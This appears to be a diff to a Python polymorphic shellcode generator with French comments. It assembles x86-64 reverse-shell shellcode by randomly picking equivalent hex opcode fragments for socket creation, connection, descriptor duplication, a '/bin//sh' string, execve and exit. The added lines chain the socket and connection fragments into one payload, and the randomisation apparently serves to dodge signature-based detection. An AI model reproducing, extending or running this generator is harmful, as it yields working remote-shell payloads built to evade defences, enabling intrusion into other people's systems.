@@ -188,17 +188,41 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 
 # Constante = 0f05
 
-list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
 
+list_const_loop = ["7df4"]
 list_xorloop = ["4831c0", "4d31c04c89c0", "b0012c01"]
 list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
 list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
 list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
 list_execve = ["B03B", "B03A0401"]
+list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
 list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]
 
-shellcode += random.choice(list_exit)
-print(shellcode)
+
+shellcode += random.choice(create_socket_1)
+shellcode += random.choice(create_socket_2)
+shellcode += random.choice(create_socket_3)
+shellcode += random.choice(create_socket_4)
+shellcode += random.choice(create_socket_6)
+shellcode += random.choice(create_socket_syscall)
+shellcode += random.choice(create_socket_mov)
+
+shellcode += random.choice(connexion_socket_1)
+shellcode += random.choice(connexion_socket_2)
+shellcode += random.choice(connexion_socket_3)
+shellcode += random.choice(connexion_socket_4)
+shellcode += random.choice(connexion_socket_5)
+shellcode += random.choice(connexion_socket_6)
+shellcode += random.choice(connexion_socket_7)
+shellcode += random.choice(connexion_socket_8)
+shellcode += random.choice(connexion_socket_9)
+shellcode += random.choice(connexion_socket_10)
+
+shellcode += random.choice(connexion_socket_11)
+shellcode += random.choice(connexion_socket_12)
+shellcode += random.choice(list_const_loop)
+shellcode += random.choice(list_xorloop)
+
 
 # Fonction qui permet l'ajout des /xFF/
 
